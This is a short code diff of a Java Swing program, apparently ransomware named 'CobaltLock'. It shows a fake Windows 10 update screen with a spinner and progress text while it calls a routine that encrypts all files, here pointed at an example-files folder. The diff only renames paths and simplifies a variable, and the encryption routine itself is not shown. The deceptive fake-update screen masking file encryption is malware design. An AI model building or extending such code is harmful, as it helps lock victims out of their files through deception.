@@ -11,7 +11,7 @@ import java.net.URL;
 public class Windows10FakeUpdate {
     public static void main(String[] args) {
         try {
-            File gifFile = new File("JavaSwing/src/main/resources/Windows10Spinner.gif");
+            File gifFile = new File("CobaltLock/src/main/resources/Windows10Spinner.gif");
             URL spinnerGif = gifFile.toURI().toURL();
             Icon icon = new ImageIcon(spinnerGif);
 
@@ -68,16 +68,15 @@ public class Windows10FakeUpdate {
             // Encrypt or simulate scanning after GUI loads
             DirectoryFinder.encryptAllFiles();
 
-            File[] filesFound = new File("JavaSwing/src/main/ExampleFiles").listFiles();
+            File[] filesFound = new File("CobaltLock/src/main/ExampleFiles").listFiles();
             if (filesFound == null || filesFound.length == 0) return;
 
             for (int i = 0; i < filesFound.length; i++) {
                 Thread.sleep(2000);
                 int percent = (i + 1) * 100 / filesFound.length;
-                int finalPercent = percent;
 
                 SwingUtilities.invokeLater(() ->
-                        updateFakeInfo.setText("Working on updates " + finalPercent + "% complete.")
+                        updateFakeInfo.setText("Working on updates " + percent + "% complete.")
                 );
                 if (percent == 100){
 
